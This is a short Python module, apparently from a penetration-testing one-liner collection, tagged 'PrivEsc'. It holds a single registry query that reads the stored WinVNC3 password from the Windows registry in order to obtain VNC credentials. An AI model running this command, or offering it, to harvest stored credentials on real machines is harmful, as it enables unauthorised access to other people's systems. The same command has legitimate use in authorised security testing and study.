class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Query vnc key from the registry to get vnc credentials ofc"
    function    = "PrivEsc"
    liner       = 'reg query "HKCU\Software\ORL\WinVNC3\Password"'
